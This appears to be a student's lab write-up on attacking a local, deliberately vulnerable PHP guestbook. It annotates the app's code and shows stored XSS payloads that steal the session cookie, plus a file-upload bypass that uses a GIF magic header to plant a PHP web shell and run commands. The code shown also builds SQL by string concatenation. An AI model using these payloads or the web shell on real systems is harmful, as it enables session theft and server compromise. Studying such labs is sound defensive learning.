<script>alert(document.cookie)</script>
When open page source 
<div id="guestbook_comments">Name: aaa<br />Message: <script>alert(document.cookie)</script><br /></div>

<script src=http://localhost:1234/attack.js></script>

<body onload="alert(document.cookie)">

<body onload="src=http://localhost:1234/attack.js">


$name = str_replace('<script>', '', $name);



lab/
├── db/
│   ├── registered.sql
│   └── Dockerfile
└── playground/
    ├── src/
    │       ├── img/
    │       ├── css/
    │       ├── js/
    │       ├── config.php
    │       ├── index.php
    │       ├── login.php
    │       ├── register.php
    │       └── logout.php
    └── Dockerfile
docker-compose.yml

config.php : defines constants for the database server, username, password, and database name, and then establishes a connection to the MySQL database using mysqli_connect()

First of all the function : 
- The trim() : function removes whitespace and other predefined characters from both sides of a string.
- mysqli_prepare() : a function in PHP that prepares an SQL statement for execution. It's commonly used in MySQL database operations, especially when dealing with user inputs to prevent SQL injection attacks.
- mysqli_stmt_bind_param() : Bind variables to the statement as parameters


Importance : 
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME); 


index.php :

if (!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== TRUE) {
    echo "<script>" . "window.location.href='./login.php';" . "</script>";
    exit;
}
// When u enter http://localhost:4040/index.php without login your account you will be redirected to the login page.


$dir = './playground/src/uploads/' . session_id();
// When u upload image it will be update in ./playground/src/uploads/


if (!is_dir($dir) && !mkdir($dir, 0755, true)) {
    die('Failed to create directory');
}
// Create directory if it doesn't exist


$error = '';
$success = '';
// variables are typically used to store error or success messages.


if (isset($_FILES["file"])) {
        try { 
		...
	  catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
// finfo_open(FILEINFO_MIME_TYPE) : PHP function used to create a fileinfo resource that is capable of returning the MIME type of a file.
// [?] MIME (Multipurpose Internet Mail Extensions) : is a standard that helps classify the types of files used on the Internet.

// $whitelist = array("image/jpeg", "image/png", "image/gif") : check whether the MIME type of an uploaded file matches one of these accepted types before allowing the file to be processed further.
// [?] $whitelist is an array containing a list of MIME types that are considered acceptable or allowed.


$message = trim($_POST['mtxMessage']);
$name    = trim($_POST['txtName']);
// removes whitespace

$user_id = $_SESSION["id"];
// "id" is the column in your users table that uniquely identifies users

$message = strip_tags($message);
// removes any HTML tags from the $message string. It ensures that only plain text remains.

$message = mysqli_real_escape_string($link, $message);
// Any characters that have special meaning in SQL queries are properly escaped, reducing the risk of SQL injection attacks.

$message = htmlspecialchars( $message );
// converts special characters in the $message string to HTML entities. For example, encoding <, >, &, etc., into their respective HTML entity representations, ensuring that they are displayed as text rather than interpreted as HTML by the browser.

$name = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name);
// searches for any occurrence of the word "script" and remove

$query  = "INSERT INTO guestbook (user_id, comment, name, image) VALUES ('$user_id', '$message', '$name', '$file');";
$result = mysqli_query($link, $query) or die('<pre>' . mysqli_error($link) . '</pre>');
// Update database for user

$user_id = $_SESSION["id"];
$query = "DELETE FROM guestbook WHERE user_id = $user_id";
$result = mysqli_query($link, $query) or die('<pre>' . mysqli_error($link) . '</pre>');
// Delete all data from table guestbook belong to user are logging

---------------------------------------------------------------------------
XSS Attack

I Try input : <script>alert(document.cookie)</script> in Message but it print ' alert(document.cookie) ' and <body onload="alert(document.cookie)"> is also
Beacase 
        $message = trim($_POST['mtxMessage']);
        $name    = trim($_POST['txtName']);
        $user_id = $_SESSION["id"];

So I change target to name 
When I see in HTML 
<td><input name="txtName" type="text" class="form-control" size="30" maxlength="10" required></td>
It's not enough for <script>alert(document.cookie)</script>, then I change it become 100 by inspect

-> Name : <body onload="alert(document.cookie)">

[OutPut] : PHPSESSID=8070cd98aa620503fdee761bf8939af3



---------------------------------------------------------------------------
Fileupload Attack

You can only upload "image/jpeg", "image/png", "image/gif"
And I using Burpsuit: 

	- I upload an image and you can see there so many character. Why we have so many ?
	[?] They are actual content of the image file. In this case, it's a PNG image file. 
	    You're seeing the raw bytes of the PNG file, which include metadata, image. data, and possibly compression information. 

	[Way 1] : I delete all content of the image file except the first line and change it become : <?php system($_REQUEST["cmd"]); ?>
		Remember change filename : sth.php
	[Way 2] : Using Magic header 
		- Create an payload.php : <?php system($_REQUEST["cmd"]); ?>
	[?] Magic header : refers to a sequence of bytes or characters placed at the beginning of a file or data stream to indicate its file type or format
		- You can see List_of_file_signatures, I using GIF87a and put it before <?php system($_REQUEST["cmd"]); ?> and I success to upload a payload

http://localhost:4040/playground/src/uploads/73dd50d5ab31054e71202b8a5b209ae7/test.php?cmd=id

[Output] uid=33(www-data) gid=33(www-data) groups=33(www-data)

